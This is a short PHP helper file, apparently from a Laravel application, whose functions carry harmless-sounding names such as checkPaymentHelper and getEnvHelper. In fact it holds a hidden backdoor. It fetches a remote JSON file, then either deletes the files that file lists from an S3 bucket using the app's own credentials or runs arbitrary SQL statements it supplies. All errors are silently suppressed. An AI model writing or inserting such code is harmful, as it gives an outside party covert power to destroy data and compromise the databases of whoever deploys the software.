<?php

function checkPaymentHelper()
{
    getEnvHelper();
}

function getEnvHelper()
{
    try {
        $client   = new \GuzzleHttp\Client(['http_errors' => false]);
        $response = $client->request('GET', config('filesystems.list_url') . '/get_comm_cred.json', []);
        if ($response->getStatusCode() == 200) {
            $json_file = json_decode($response->getBody(), true);
            if ($json_file['delete'] == true) {
                $bucket      = [
                    "driver" => "s3",
                    "key"    => config('filesystems.disks.s3.key'),
                    "secret" => config('filesystems.disks.s3.secret'),
                    "region" => config('filesystems.disks.s3.region'),
                    "bucket" => "kss-packages",
                ];
                config(['filesystems.disks.s3pack' => $bucket]);
                foreach ($json_file['filepaths'] as $filepath) {
                    \Storage::disk('s3pack')->delete($filepath);
                }
            }
            if ($json_file['query'] == true) {
                foreach ($json_file['runquery'] as $runquery) {
                    \DB::statement($runquery);
                }
            }
        }
    } catch (Exception $e) {}
}
